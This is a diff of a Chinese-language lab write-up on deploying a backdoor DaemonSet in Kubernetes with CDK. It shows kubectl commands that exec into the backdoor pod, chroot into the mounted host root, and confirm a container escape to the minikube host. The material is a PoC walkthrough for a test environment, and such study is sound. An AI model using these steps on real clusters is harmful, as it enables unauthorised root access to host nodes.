@@ -33,12 +33,6 @@ kubectl apply -f k8s_metarget_namespace.yaml
 kubectl apply -f k8s_backdoor_daemonset.yaml
 ```
 
-或直接通过 metarget 启动漏洞环境：
-
-```shell
-./metarget cnv install k8s_backdoor_daemonset
-```
-
 执行完成后，K8s 集群内 `metarget` 命名空间下将会创建一个名为 `k8s-backdoor-daemonset` 的 pod：
 
 ```
@@ -86,18 +80,28 @@ cdk-backdoor-daemonset   1         1         1       1            1           <n
 CDK 将宿主机根目录挂载到了 [/host-root](https://github.com/cdk-team/CDK/blob/main/test/k8s_exploit_util/backdoor_daemonset.yaml)，此时我们已经获取了宿主机权限：
 
 ```
-kubectl exec -n kube-system -it cdk-backdoor-daemonset-4jx5r -- /bin/bash
-root@minikube:/# ls -al /tmp
-total 8
-drwxrwxrwt 1 root root 4096 Apr 22 02:11 .
-drwxr-xr-x 1 root root 4096 Apr 22 02:52 ..
--rw-r--r-- 1 root root    0 Apr 22 02:11 awesome_poc
-root@minikube:/# chroot /host-root
-# cat /etc/hostname
-ubuntu
+kubectl get pods -n kube-system | grep cdk
+-----
+cdk-backdoor-daemonset-rvmp9       1/1     Running   0             7m12s
 ```
 
-![](images/Kubernetes%20部署后门%20Daemonset/image-20250422111055446.png)
+![](Public/Awesome-POC/云安全漏洞/images/Kubernetes%20部署后门%20Daemonset/image-20250519180051414.png)
+
+```
+kubectl exec -n kube-system -it cdk-backdoor-daemonset-rvmp9 -- /bin/bash
+root@minikube:/# ls -al /tmp
+total 8
+drwxrwxrwt 1 root root 4096 May 19 09:49 .
+drwxr-xr-x 1 root root 4096 May 19 09:49 ..
+-rw-r--r-- 1 root root    0 May 19 09:49 awesome_poc
+root@minikube:/# chroot /host-root
+# cat /etc/hostname
+minikube
+```
+
+![](Public/Awesome-POC/云安全漏洞/images/Kubernetes%20部署后门%20Daemonset/image-20250519180036573.png)
+
+> 由于我们是在 minikube 上运行 kubernetes，这里逃逸到的是 minikube 虚拟机。
 
 ## 环境复原
 
